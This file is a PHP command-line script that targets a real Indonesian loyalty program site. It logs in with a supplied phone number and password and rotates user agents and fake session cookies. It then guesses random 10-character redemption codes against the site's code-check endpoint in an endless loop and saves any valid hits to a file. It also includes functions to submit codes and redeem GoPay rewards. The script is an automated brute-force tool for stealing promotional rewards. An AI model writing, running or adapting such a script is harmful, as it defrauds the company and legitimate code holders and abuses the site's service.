<?php
error_reporting(0);
include("uagent.php");
date_default_timezone_set('Asia/Jakarta');
$ua = random_uagent();
//echo "$ua\n";
function curl($param,$headers,$url)
	{
		$ch = curl_init();
		curl_setopt($ch, CURLOPT_URL, $url);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($ch, CURLOPT_POST, 1);
		curl_setopt($ch, CURLOPT_POSTFIELDS, $param);
		curl_setopt($ch, CURLOPT_ENCODING, "GZIP,DEFLATE");
		curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
		$result = curl_exec($ch);
		if (curl_errno($ch)) {
   		echo 'Error:' . curl_error($ch);
			}
		curl_close($ch);
		return $result;
	}

function getConfig()
	{
		if(file_exists("config.json")){
		$file = file_get_contents("config.json");
		$data = json_decode($file, true);
		return $data;
		} else {
		system("touch config.json");
		echo " ▶ Write file config.json\n"; die;
		}
	}

function path($method,$headers,$url)
	{
		$ch = curl_init();
		curl_setopt($ch, CURLOPT_URL, $url);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($ch, CURLOPT_CUSTOMREQUEST, $method);
		curl_setopt($ch, CURLOPT_ENCODING, "GZIP,DEFLATE");
		curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
		$result = curl_exec($ch);
		if (curl_errno($ch)) {
   		echo 'Error:' . curl_error($ch);
			}
		curl_close($ch);
		return $result;
	}
	

function curlheader($param,$headers,$url)
	{
		$ch = curl_init();
		curl_setopt($ch, CURLOPT_URL, $url);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($ch, CURLOPT_POST, 1);
		curl_setopt($ch, CURLOPT_POSTFIELDS, $param);
		curl_setopt($ch, CURLOPT_ENCODING, "GZIP,DEFLATE");
		curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
		curl_setopt($ch, CURLOPT_HEADER, 1);
		$result = curl_exec($ch);
		if (curl_errno($ch)) {
   		echo 'Error:' . curl_error($ch);
			}
		curl_close($ch);
		return $result;
	}

function build_data_files($boundary, $fields)
    {
        $data = '';
        $eol = "\r\n";

        $delimiter = '----' . $boundary;

        foreach ($fields as $name => $content) {
            $data .= "--" . $delimiter . $eol
                . 'Content-Disposition: form-data; name="' . $name . "\"" . $eol . $eol
                . $content . $eol;
        }
        $data .= "--" . $delimiter . "--" . $eol;


        return $data;
    }

$Grey   = "\e[1;30m";
$Red    = "\e[0;31m";
$Green  = "\e[0;32m";
$Yellow = "\e[0;33m";
$Blue   = "\e[1;34m";
$Purple = "\e[0;35m";
$Cyan   = "\e[0;36m";
$White  = "\e[0;37m";


function login($nomor,$password,$randString,$ua)
{
	$url = "https://www.generasimaju.co.id/klub-generasi-maju/login";
	$param = "msisdn=$nomor&password=$password";
	$headers = array();
	$headers[] = 'Content-Length: '.strlen($param);
	$headers[] = 'Content-Type: application/x-www-form-urlencoded';
	$headers[] = 'User-Agent: '.$ua;
	$headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9';
	$headers[] = 'Accept-Encoding: gzip, deflate';
	$headers[] = 'Accept-Language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7';
	$headers[] = 'Cookie: PHPSESSID='.$randString;
	return curlheader($param,$headers,$url);
}

function getInfo($session,$ua)
{
	$url = "https://www.generasimaju.co.id/klub-generasi-maju/akun";
	$method = "GET";
	$headers = array();
	$headers[] = 'User-Agent: '.$ua;
	$headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9';
	$headers[] = 'Accept-Encoding: gzip, deflate';
	$headers[] = 'Accept-Language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7';
	$headers[] = 'Cookie: PHPSESSID='.$session;
	return path($method,$headers,$url);
}

function getMisi($session,$ua)
{
	$url = "https://www.generasimaju.co.id/klub-generasi-maju/listmission";
	$method = "GET";
	$headers = array();
	$headers[] = 'User-Agent: '.$ua;
	$headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9';
	$headers[] = 'Accept-Encoding: gzip, deflate';
	$headers[] = 'Accept-Language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7';
	$headers[] = 'Cookie: PHPSESSID='.$session;
	return path($method,$headers,$url);
}

function claimCode($kode,$session,$ua)
{
	$url = "https://www.generasimaju.co.id/klub-generasi-maju/check-unique-code";
	$param = "code=$kode";
	$headers = array();
	$headers[] = 'Content-Length: '.strlen($param);
	$headers[] = 'Accept: application/json, text/javascript, */*; q=0.01';
	$headers[] = 'X-Requested-With: XMLHttpRequest';
	$headers[] = 'User-Agent: '.$ua;
	$headers[] = 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8';
	$headers[] = 'Accept-Encoding: gzip, deflate';
	$headers[] = 'Accept-Language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7';
	$headers[] = 'Cookie: PHPSESSID='.$session;
	return curl($param,$headers,$url);
}

function submitCode($kode,$session,$nomor,$ua)
{
	$url = "https://www.generasimaju.co.id/klub-generasi-maju/submit-kode-unik";
	$param = "phoneNumber=$nomor&uniquecode%5B%5D=$kode";
	$headers = array();
	$headers[] = 'Content-Length: '.strlen($param);
	$headers[] = 'Accept: application/json, text/javascript, */*; q=0.01';
	$headers[] = 'X-Requested-With: XMLHttpRequest';
	$headers[] = 'User-Agent: '.$ua;
	$headers[] = 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8';
	$headers[] = 'Accept-Encoding: gzip, deflate, br';
	$headers[] = 'Accept-Language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7';
	$headers[] = 'Cookie: PHPSESSID='.$session;
	return curl($param,$headers,$url);
}

function redeemGopay($nomor,$uname,$session,$proid,$ua,$code)
{
	$url = "https://www.generasimaju.co.id/klub-generasi-maju/redeem-catalog";
	$param = "code=$code&name=$uname&phone=$nomor&redemptionType=4&progressid=$proid";
	$headers = array();
	$headers[] = 'Content-Length: '.strlen($param);
	$headers[] = 'Accept: application/json, text/javascript, */*; q=0.01';
	$headers[] = 'X-Requested-With: XMLHttpRequest';
	$headers[] = 'User-Agent: '.$ua;
	$headers[] = 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8';
	$headers[] = 'Accept-Encoding: gzip, deflate, br';
	$headers[] = 'Accept-Language: id-ID,id;q=0.9';
	$headers[] = 'Cookie: PHPSESSID='.$session;
	return curl($param,$headers,$url);
}


function cekkode($Green,$Red,$White,$Yellow,$ua)
{
	menuClaim:
	$randString = substr(str_shuffle('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'), 0, 27);
	echo "\n$Yellow Menu SGM Login + Input + Redeem";
	
	loginaja:
	echo "\n\n$White -----------------------------------------------\n$Yellow Randstring :$Red $randString";
	echo "\n$Yellow User Agent :$Red $ua\n $White-----------------------------------------------\n";
	echo "\n$White ▶ Nomor : ";
	$nomor = trim(fgets(STDIN));
	echo "\n$Green ▶ Logined$Yellow $nomor";
	$load = getConfig($Red);
	$password = $load['password_load'];
	$no++;
	$ceki = substr($nomor,0,1);
	if($ceki == "8")
	{
		$nomor = "62$nomor";
		} else if($ceki == "0"){
		$nomor = substr($nomor,1);
		$nomor = "62$nomor";
		} else if($ceki == "62"){
		$nomor = "$nomor";
		} else if(preg_match('/+/i',$nomor)){
		$nomor = str_replace('+','',$nomor);
	}
	$log = login($nomor,$password,$randString,$ua);
	list($head,$param) = explode("\r\n\r\n",$log,2);
	$stc = explode('<a href="/klub-generasi-maju/',$param)[1];
	$str = explode('">',$stc)[0];
	if($str == "login")
	{
		echo "$Red ▶ Nomor atau kata sandi salah";
		goto loginaja;
		} else if($str == "akun"){
		preg_match_all('/^Set-Cookie:\s*([^;]*)/mi', $log, $matches);
		//print_r($matches);
		$cookies = array();
		echo "\n$Green [-] Login Berhasil";
		//echo "\n$Green [-] Cookie Tersimpan";
		foreach($matches[1] as $item)
		{
   		parse_str($item, $cookie);
   		$cookies = array_merge($cookies, $cookie);
		$items[] = $item;
		}
		$session = $cookies['PHPSESSID'];
		$cook = $matches[1];
		//file_put_contents("akun_sgm.txt",$nomor." | ".$cook[0]."; ".$cook[1]."; ".$cook[2]."; ".$cook[3]."\n",FILE_APPEND);
		} else {
		var_dump("\n\n$session\n\n");
	}
	
	redemkodemu:
	echo "\n$White ▶ Kode Redeem : ";
	$kodeku = substr(str_shuffle(str_repeat("2346789abcdefghjklmnpqrtuvwxyz", 5)), 0, 10);
	echo $kodeku ;
	$kode = $kodeku;
	$redem = claimCode($kode,$session,$ua);
	$js = json_decode($redem, true);
	if($js['result'] == 0)
	{
		echo "$Red ▶ ".$js['message']. "\n";
		goto redemkodemu;
		} else if($js['result'] == 1){
		echo "$Green ▶ Kode redeem SGM Valid\n";
		file_put_contents("KODEVALID.txt",$kode."\n",FILE_APPEND);
		goto redemkodemu;
		} else 
		echo "$Red ▶ Kode Sudah Digunakan\n";
		goto redemkodemu;
}









checkmenu:
echo "\n$Red ▶  Redeem Point Manual";
$xtc = 1;
if($xtc == "1")
{
	
	$anu = cekkode($Green,$Red,$White,$Yellow,$ua);
	} else {
	echo "\n$Red ▶ Yang bener boy\n";
	goto checkmenu;
}